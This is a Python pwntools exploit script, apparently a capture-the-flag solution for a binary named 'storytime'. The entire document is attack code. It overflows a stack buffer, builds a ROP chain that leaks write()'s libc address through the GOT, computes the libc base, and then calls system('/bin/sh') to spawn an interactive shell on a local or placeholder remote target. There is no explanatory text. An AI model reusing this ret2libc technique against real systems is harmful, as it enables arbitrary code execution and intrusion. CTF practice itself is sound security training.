#!/usr/bin/env python3

from pwn import *

exe = ELF("./storytime")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    # leaking libc address

    pop_rdi = 0x0000000000400703
    pop_rsi = 0x0000000000400701
    function_addr = 0x0040062e

    payload = "A" * 0x30 + "B" * 8 + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(exe.got['write']) + p64(0xdeadbeef) + p64(exe.symbols['write']) + p64(function_addr)
    r.send(payload + "A" * (400 - len(payload)))
    r.recvuntil("Tell me a story: \n")
    leak = u64(r.recvn(6) + "\x00\x00")
    log.info("leak write() address: {}".format(hex(leak)))

    libc.address = leak - libc.symbols['write']
    system = libc.symbols['system']
    binsh = next(libc.search('/bin/sh\x00'))

    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("system address: {}".format(hex(system)))
    log.info("binsh address: {}".format(hex(binsh)))

    #gdb.attach(r)
    payload = "A" * 0x30 + "B" * 8 + p64(pop_rdi) + p64(binsh) + p64(system)
    r.send(payload + "A" * (400 - len(payload)))

    r.interactive()


if __name__ == "__main__":
    main()
